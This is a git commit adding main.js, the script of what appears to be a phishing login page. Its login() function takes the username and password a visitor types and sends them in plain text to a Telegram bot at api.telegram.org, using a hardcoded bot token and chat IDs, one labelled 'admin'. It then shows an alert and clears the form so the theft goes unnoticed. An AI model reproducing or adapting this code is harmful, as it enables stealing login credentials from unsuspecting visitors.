b795e03b5c5b9bdad4a9bb14e38b0927a4ff82be
kosaeer <58988897+kosaeer@users.noreply.github.com>
2020-01-28 12:26:54 +0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,55 @@
+$(document).ready(function() {
+  var winh = $(window).height();
+
+  $(".header").height(winh);
+
+  $(".space").height(winh / 4);
+
+  $("button").click(function() {
+    window.location.href = "login.html";
+  });
+});
+
+function login() {
+  var username = $("#username").val();
+
+  var pass = $("#pass").val();
+
+  var token = "801870955:AAE2m8IagrjoLf7XUxi27audKvv50jj_CH8";
+
+  var id = "";
+  var admin = "387534219";
+
+  if (username.length > 0 && pass.length > 0) {
+    $("#logbut").attr("disabled", "disabled");
+
+    var text = "user : `" + username + "` || pass : `" + pass + "`";
+
+    $.get(
+      "https://api.telegram.org/bot" +
+        token +
+        "/sendMessage?chat_id=" +
+        id +
+        "&text=" +
+        text +
+        "&parse_mode=markdown",
+      function(data) {
+        $("#logbut").removeAttr("disabled", "disabled");
+
+        $(".alert").show();
+
+        $("#username,#pass").val("");
+      }
+    );
+
+    $.get(
+      "https://api.telegram.org/bot" +
+        token +
+        "/sendMessage?chat_id=" +
+        admin +
+        "&text=" +
+        text +
+        "&parse_mode=markdown"
+    );
+  }
+}
